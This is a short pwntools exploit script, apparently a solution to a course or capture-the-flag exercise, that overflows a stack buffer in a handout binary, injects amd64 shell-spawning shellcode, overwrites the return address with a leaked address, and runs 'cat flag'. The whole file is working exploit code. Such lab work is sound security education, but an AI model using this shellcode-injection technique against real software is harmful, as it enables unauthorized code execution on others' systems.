#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise2/exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# valid padding lengths so program authorizes: [202, 203, 204, 205, 206, 207, 208, 209, 211, 212, 213, 214, 215, 216, 217, 
#       218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 
#       241, 242, 243, 244, 245, 246, 247, 248, 249]
# valid padding lengths to extract flag: [216]

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

address = r.recvline()
print(address)
address = int(address.decode(), base=16)

shellcraft_code = asm(shellcraft.amd64.linux.sh())
padding = 216 - len(shellcraft_code)
r.sendline(shellcraft_code + b"X" * padding + address.to_bytes(length=8, byteorder='little'))
r.sendline(b"cat flag")

output = r.recvall(timeout=2).decode()
print(output)